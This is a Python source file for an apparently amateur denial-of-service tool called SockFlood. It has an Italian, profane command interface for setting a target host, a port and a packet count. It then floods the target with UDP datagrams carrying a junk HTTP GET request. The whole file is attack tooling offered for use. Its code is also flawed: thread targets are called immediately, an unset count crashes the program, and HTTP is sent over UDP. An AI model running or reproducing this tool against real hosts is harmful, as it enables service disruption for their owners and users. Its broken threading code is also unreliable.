import os
import socket
import string
import random
import threading
from colorama import Fore, Back, Style

class SockFlood:
	def __init__(self):
		os.system("cls")
		os.system("title Il tool sloppano piu potente del secolo. ")
		self.host=None
		self.portnum=None
		self.threads=None

	def graphics(self):
		banner="""
		 ██▓███    ██████ ▓██   ██▓  █████▒ ██▓     ▒█████   ▒█████  ▓█████▄ 
		▓██░  ██▒▒██    ▒  ▒██  ██▒▓██   ▒ ▓██▒    ▒██▒  ██▒▒██▒  ██▒▒██▀ ██▌
		▓██░ ██▓▒░ ▓██▄     ▒██ ██░▒████ ░ ▒██░    ▒██░  ██▒▒██░  ██▒░██   █▌
		▒██▄█▓▒ ▒  ▒   ██▒  ░ ▐██▓░░▓█▒  ░ ▒██░    ▒██   ██░▒██   ██░░▓█▄   ▌
		▒██▒ ░  ░▒██████▒▒  ░ ██▒▓░░▒█░    ░██████▒░ ████▓▒░░ ████▓▒░░▒████▓ 
		▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░   ██▒▒▒  ▒ ░    ░ ▒░▓  ░░ ▒░▒░▒░ ░ ▒░▒░▒░  ▒▒▓  ▒ 
		░▒ ░     ░ ░▒  ░ ░ ▓██ ░▒░  ░      ░ ░ ▒  ░  ░ ▒ ▒░   ░ ▒ ▒░  ░ ▒  ▒ 
		░░       ░  ░  ░   ▒ ▒ ░░   ░ ░      ░ ░   ░ ░ ░ ▒  ░ ░ ░ ▒   ░ ░  ░ 
					   ░   ░ ░                 ░  ░    ░ ░      ░ ░     ░    
						   ░ ░                                        ░      
		"""
		print(Fore.RED+banner)
		print(Fore.YELLOW+"""
		[+] Il tool sloppano piu epico [+]"""+Fore.GREEN+"""
		[+] Developer : SloppyDev """)
		print(Fore.WHITE+"""
		[+] Scrivi `help` se non sai un cazzo [+]
			""")

	def start_attack(self,host,port=None):
		self.sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
		try:
			url_path=str(string.ascii_letters + string.digits + string.punctuation)
			byt = (f"GET /{url_path} HTTP/1.1\nHost: {host}\n\n").encode()
			if not port:
				self.sock.sendto(byt,(host,80))
			elif port:
				self.sock.sendto(byt,(host,int(port)))
			print(Fore.WHITE+"""[+] Pacchetto Mandato con Successo""")
		except Exception as e:
			print(Fore.RED+f"""
	[-] Errore Socket! Fatal X_X
	[-] ERRORE : {e}
						""")

	def command_parser(self,command):
		if command=="help":
			print(Fore.WHITE+"""
	Benvenuto sullo sdrumatore 2000 - 

	(+) host %HOST% - Metti l'ip da mangiare 
	(+) port %PORT% - Metti la porta da bere o di default c'ho messo 80, fattelo andare bene :D
	(+) attacks %AMOUNT% - Quante volte vuoi fregare il tipo? Di default 1000 ma ti consiglio almeno 50000 se vuoi vedere qualcosa.
	(+) start - Inizii a fare pranzo :D
	""")
		if "host " in command:
			self.host=command.replace("host ","").replace("https://", "").replace("http://", "").replace("www.", "")
			print(Fore.WHITE+f"""
	[+] Settato ip da mangiare a {self.host}
				""")
		elif "port " in command:
			self.portnum=command.replace("port ","")
			print(Fore.WHITE+f"""
	[+] Settata porta da bere a {self.portnum}
				""")
		elif command=="start":
			print(self.portnum)
			if self.host and self.portnum:
				if int(self.threads):
					for i in range(1,int(self.threads)):
						threading.Thread(target=self.start_attack(self.host,self.portnum)).start()
				else:
					for i in range(1,1000):
						threading.Thread(target=self.start_attack(self.host,self.portnum)).start()
			elif self.host and not self.portnum:
				if int(self.threads):
					for i in range(1,int(self.threads)):
						threading.Thread(target=self.start_attack(self.host)).start()
				else:
					for i in range(1,1000):
						threading.Thread(target=self.start_attack(self.host)).start()
		elif "attacks " in command:
			self.threads=command.replace("attacks ","")
			print(Fore.WHITE+f"""
	[+] Settato numero di attachi dei delfini a {self.threads}
				""")

	def run(self):
		self.graphics()
		while True:
			self.command_parser(input(Fore.CYAN+f"${os.environ.get('USERNAME')}$>> "))

if __name__=="__main__":
	app=SockFlood()
	app.run()